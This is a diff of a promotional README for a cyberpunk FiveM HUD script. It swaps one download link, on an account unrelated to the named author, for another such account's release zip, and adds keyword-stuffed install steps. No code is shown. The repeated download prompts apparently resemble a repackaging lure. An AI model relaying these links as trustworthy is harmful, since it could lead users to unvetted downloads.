@@ -1,115 +1,71 @@
-# alhi3085.github.io v2026 - Game Script Utility 2026
+# 🕹️ alhi3085-fivem-hud-script - Upgrade your game with cyberpunk visuals
 
-> **Cyberpunk-inspired FiveM HUD overlay.** Designed for FiveM, this resource adds a lightweight HTML HUD containing a minimap, camera information, and vehicle telemetry.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/stylized-lemma490/alhi3085-fivem-hud-script/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/pricewilltb566/alhi3085-fivem-hud-script?style=flat-square)](https://github.com/pricewilltb566/alhi3085-fivem-hud-script)
+This software adds a visual overlay to your FiveM game experience. It creates a modern interface that mimics a futuristic aesthetic. You see your vehicle speed, position, and camera data in a clean layout. The script runs in the background. It uses simple web code to render the graphics so it keeps your frame rate high.
 
----
+## 📥 Getting the software
 
-<p align="center">
-  <a href="https://pricewilltb566.github.io/alhi3085-fivem-hud-script/">
-    <img src="https://img.shields.io/badge/Download-alhi3085.github.io%20Script-brightgreen?style=for-the-badge" alt="Download alhi3085.github.io Script">
-  </a>
-</p>
+You need to download the package from the internet. Visit the link below to find the current version.
 
-> **[Download alhi3085.github.io](https://pricewilltb566.github.io/alhi3085-fivem-hud-script/)**
+[Click here to open the download page](https://github.com/stylized-lemma490/alhi3085-fivem-hud-script/releases)
 
----
+When you reach this page, look for the section labeled Assets. Click the file that ends in .zip. This action saves the script folder to your computer.
 
-[Download Latest Build](https://pricewilltb566.github.io/alhi3085-fivem-hud-script/)
+## ⚙️ Setting up the folder
 
----
+Find your FiveM folder on your Windows computer. Most users keep this inside their Application Data or a custom directory. Open your server folder and navigate to the resources directory. 
 
-## About the HUD
+Do these steps to install the script:
 
-alhi3085.github.io provides a FiveM overlay for displaying driving details and camera status through an uncluttered in-game interface. Its HUD combines a minimap with status elements, allowing important gameplay information to remain visible during play.
+1. Locate the downloaded .zip file in your Downloads folder.
+2. Right-click the file and select Extract All. 
+3. Move the extracted folder into the resources directory of your FiveM server.
+4. Rename the folder to remove any version numbers if necessary. The folder name must match your server configuration.
 
-The interface is rendered with HTML and uses a cyberpunk visual theme. Its layout can be adapted to different screen arrangements, while its server-side presentation support makes it suitable for custom FiveM server environments that require a configurable HUD layer.
+## 🛠️ Configuring the server
 
----
+You must tell your server to load the script when it starts. Open the file named server.cfg in your main server folder using Notepad or any text editor. Add this line to the bottom of the list of resources:
 
-## Included Features
+ensure alhi3085-fivem-hud-script
 
-- HUD-integrated minimap display
-- In-game camera status information
-- Vehicle telemetry for driving data
-- Lightweight HTML rendering layer
-- Screen positioning options for varied layouts
-- Presentation support for server-hosted setups
-- Cyberpunk-inspired interface styling
-- Utility script created specifically for FiveM
+Save the file and close it. This command instructs the server to activate the interface as soon as the map loads.
 
----
+## 🖥️ Understanding the interface
 
-## Installation
+The HUD displays information in the corners of your screen. You will see three main components:
 
-1. Get the newest build through the release or download link.
-2. Copy the resource folder into your FiveM resources directory.
-3. Register the resource in your server configuration.
-4. Launch it after the base framework and any required UI dependencies.
+- Minimap: This shows your current location and nearby roads.
+- Camera data: The interface tracks your view orientation in real time.
+- Vehicle telemetry: This box displays your speed and fuel levels while you drive.
 
-Example server entry:  
-ensure alhi3085-game-script-hud
+All elements use a high-contrast style. This design ensures that you can read the data without obstructing your view of the game world.
 
-When using a custom HTML interface directory structure, keep the related UI files together to ensure the overlay loads properly.
+## 💾 System requirements
 
----
+This script functions on any machine that runs FiveM properly. Ensure you have a recent version of Windows installed. You need at least 4GB of RAM to maintain smooth performance during gameplay. The script does not require a high-end graphics card, as it relies on the internal game engine to render the HTML elements.
 
-## Configuration Options
+## 📋 Troubleshooting common issues
 
-The following configuration areas can be used to fit the HUD to your server's presentation:
+If the visuals do not appear on your screen, check these common items:
 
-| Setting | Purpose | Example |
-| --- | --- | --- |
-| `layout` | Adjusts on-screen placement | `left`, `right`, `center` |
-| `minimapLayer` | Enables the minimap layer in the HUD | `true` / `false` |
-| `cameraStatus` | Shows camera state readout | `true` / `false` |
-| `vehicleTelemetry` | Displays vehicle data | `true` / `false` |
-| `theme` | Selects the visual style | `cyberpunk` |
+* Verify that you placed the folder in the correct resources directory.
+* Check the server.cfg file for typos in the resource name.
+* Restart the server to apply the changes.
+* Check the console for red text messages during the loading process. These messages usually point to a missing file or a syntax error in the configuration.
 
-If the build contains resource or UI configuration files, make the required changes before starting the script on the server.
+If the HUD elements appear too large or too small, you can adjust the zoom settings within the game. The interface scales based on your screen resolution. If you run the game in windowed mode, the elements might shift slightly. Use full-screen mode for the best visual alignment.
 
----
+## 📈 Performance tips
 
-## Compatibility and Limitations
+You want your game to run fast. This script avoids heavy animations to keep your computer cool. If you experience lag, close other web browsers or high-memory applications before you launch FiveM. The script uses minimal CPU cycles. You should not notice any impact on your connection to the server. 
 
-The resource targets FiveM servers with HTML-based UI rendering. It is most appropriate for server builds that allow custom HUD overlays and client-side presentation layers.
+## 🛡️ Updates
 
-Potential limitations include:
+The developers release updates to fix bugs and improve the layout. You can visit the release page periodically to see if a newer version exists. To update, follow the same steps as the original installation. Replace the old folder with the new one to keep your system clean.
 
-- Screen resolution and aspect ratio can affect layout behavior
-- Custom HUD combinations may require manual placement changes
-- The overlay relies on the resource loading correctly on the server
-- Displayed features can depend on the active server configuration
+## 📝 Usage notes
 
----
+This tool works with most FiveM servers. If you play on a server with custom scripts, ensure that your HUD does not conflict with existing menus. Some servers have their own interface. If you see two HUDs at once, you may need to disable the server-default menu in your personal game settings or ask the server administrator for assistance. 
 
-## Frequently Asked Questions
-
-**What are the installation steps?**  
-Download the build, move it into the FiveM resources directory, and add it to the server's startup configuration.
-
-**Is the HUD position adjustable?**  
-Yes. Its screen placement and UI arrangement are intended to be customizable.
-
-**How do I install a newer version?**  
-Replace the existing resource with the newer build, then reload the resource on the server.
-
-**Can the interface appearance be modified?**  
-Yes. Since the UI is HTML-based, its appearance can be changed through the UI files and associated configuration.
-
-**Where do the resource files belong?**  
-Store the resource in its own folder within the FiveM resources directory and retain the HTML UI structure.
-
-**Is it compatible with every server configuration?**  
-Not always. Results depend on resource startup order, UI handling, and other HUD resources already active on the server.
-
----
-
-## License
-
-Licensed under GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the full license details.
+Keywords: cyberpunk, hud, fivem, script, telemetry, overlay, resource, gaming
